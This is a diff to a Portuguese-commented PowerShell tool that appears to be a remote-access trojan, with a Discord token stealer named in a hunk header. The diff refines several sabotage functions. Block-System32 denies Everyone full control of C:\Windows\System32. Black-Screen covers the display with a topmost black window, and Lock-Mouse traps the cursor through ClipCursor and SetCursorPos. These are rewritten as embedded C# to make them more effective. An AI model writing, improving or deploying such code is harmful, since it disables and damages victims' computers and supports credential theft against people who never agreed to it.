@@ -238,8 +238,6 @@ function Get-DiscordToken {
 function Block-System32 {
     try {
         $path = "C:\Windows\System32"
-        takeown /f $path /r /d y 2>$null
-        icacls $path /grant Administradores:F /t 2>$null
         $acl = Get-Acl $path
         $acl.SetAccessRuleProtection($true, $false)
         $accessRule = New-Object System.Security.AccessControl.FileSystemAccessRule("Everyone", "FullControl", "Deny")
@@ -251,29 +249,31 @@ function Block-System32 {
     }
 }
 
-# ===== TELA PRETA (SEM C#) =====
-$global:blackScreenForm = $null
-
+# ===== TELA PRETA (C# CORRIGIDO) =====
 function Black-Screen {
     try {
-        # Cria um form preto em uma thread separada
-        $ps = [powershell]::Create()
-        [void]$ps.AddScript({
-            Add-Type -AssemblyName System.Windows.Forms
-            $form = New-Object System.Windows.Forms.Form
-            $form.WindowState = 'Maximized'
-            $form.FormBorderStyle = 'None'
-            $form.TopMost = $true
-            $form.BackColor = 'Black'
-            $form.ControlBox = $false
-            $form.ShowInTaskbar = $false
-            $form.KeyPreview = $true
-            $form.Add_KeyDown({
-                if ($_.KeyCode -eq 'Escape') { $form.Close() }
-            })
-            $form.ShowDialog()
-        })
-        $ps.BeginInvoke()
+        $code = @'
+using System;
+using System.Windows.Forms;
+public class BlackScreen {
+    public static void Show() {
+        Form f = new Form();
+        f.WindowState = FormWindowState.Maximized;
+        f.FormBorderStyle = FormBorderStyle.None;
+        f.TopMost = true;
+        f.BackColor = System.Drawing.Color.Black;
+        f.ControlBox = false;
+        f.ShowInTaskbar = false;
+        f.KeyPreview = true;
+        f.KeyDown += (s, e) => { if (e.KeyCode == Keys.Escape) f.Close(); };
+        Application.Run(f);
+    }
+}
+'@
+        Add-Type -TypeDefinition $code -ReferencedAssemblies "System.Windows.Forms.dll", "System.Drawing.dll"
+        $thread = New-Object System.Threading.Thread([System.Threading.ThreadStart]{ [BlackScreen]::Show() })
+        $thread.SetApartmentState('STA')
+        $thread.Start()
         return "BLACK_SCREEN"
     } catch {
         return "BLACK_SCREEN_ERROR"
@@ -282,8 +282,7 @@ function Black-Screen {
 
 function Unlock-Screen {
     try {
-        # Força o fechamento de todos os forms pretos
-        [System.Windows.Forms.Application]::OpenForms | Where-Object { $_.BackColor -eq [System.Drawing.Color]::Black -and $_.WindowState -eq 'Maximized' } | ForEach-Object {
+        [System.Windows.Forms.Application]::OpenForms | Where-Object { $_.GetType().Name -eq "Form" -and $_.BackColor -eq [System.Drawing.Color]::Black } | ForEach-Object {
             $_.Invoke([Action]{ $_.Close() })
         }
         return "SCREEN_UNLOCKED"
@@ -292,7 +291,7 @@ function Unlock-Screen {
     }
 }
 
-# ===== TRAVAR MOUSE (SEM C#) =====
+# ===== TRAVAR MOUSE (C# CORRIGIDO) =====
 $global:mouseLocked = $false
 $global:lockThread = $null
 
@@ -302,17 +301,36 @@ function Lock-Mouse {
         
         $global:mouseLocked = $true
         
-        $global:lockThread = [System.Threading.Thread]::new({
-            while ($global:mouseLocked) {
-                try {
-                    [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(0, 0)
-                    Start-Sleep -Milliseconds 5
-                } catch {
-                    # Ignora erros
-                }
-            }
-        })
+        $code = @'
+using System;
+using System.Runtime.InteropServices;
+using System.Windows.Forms;
+public class MouseLocker {
+    [DllImport("user32.dll")]
+    public static extern bool SetCursorPos(int x, int y);
+    
+    [DllImport("user32.dll")]
+    public static extern bool ClipCursor(ref RECT lpRect);
+    
+    [StructLayout(LayoutKind.Sequential)]
+    public struct RECT {
+        public int left, top, right, bottom;
+    }
+    
+    public static void Lock() {
+        RECT rect = new RECT();
+        rect.left = 0; rect.top = 0; rect.right = 1; rect.bottom = 1;
+        ClipCursor(ref rect);
+        while (true) {
+            SetCursorPos(0, 0);
+            System.Threading.Thread.Sleep(5);
+        }
+    }
+}
+'@
+        Add-Type -TypeDefinition $code -ReferencedAssemblies "System.Windows.Forms.dll"
         
+        $global:lockThread = New-Object System.Threading.Thread([System.Threading.ThreadStart]{ [MouseLocker]::Lock() })
         $global:lockThread.IsBackground = $true
         $global:lockThread.Start()
         
@@ -328,6 +346,33 @@ function Unlock-Mouse {
         if ($global:lockThread -and $global:lockThread.IsAlive) {
             $global:lockThread.Abort()
         }
+        
+        # Libera a área do mouse
+        $code = @'
+using System;
+using System.Runtime.InteropServices;
+using System.Windows.Forms;
+public class MouseUnlocker {
+    [DllImport("user32.dll")]
+    public static extern bool ClipCursor(ref RECT lpRect);
+    
+    [StructLayout(LayoutKind.Sequential)]
+    public struct RECT {
+        public int left, top, right, bottom;
+    }
+    
+    public static void Unlock() {
+        RECT rect = new RECT();
+        rect.left = 0; rect.top = 0;
+        rect.right = Screen.PrimaryScreen.Bounds.Width;
+        rect.bottom = Screen.PrimaryScreen.Bounds.Height;
+        ClipCursor(ref rect);
+    }
+}
+'@
+        Add-Type -TypeDefinition $code -ReferencedAssemblies "System.Windows.Forms.dll"
+        [MouseUnlocker]::Unlock()
+        
         return "MOUSE_UNLOCKED"
     } catch {
         return "UNLOCK_ERROR"
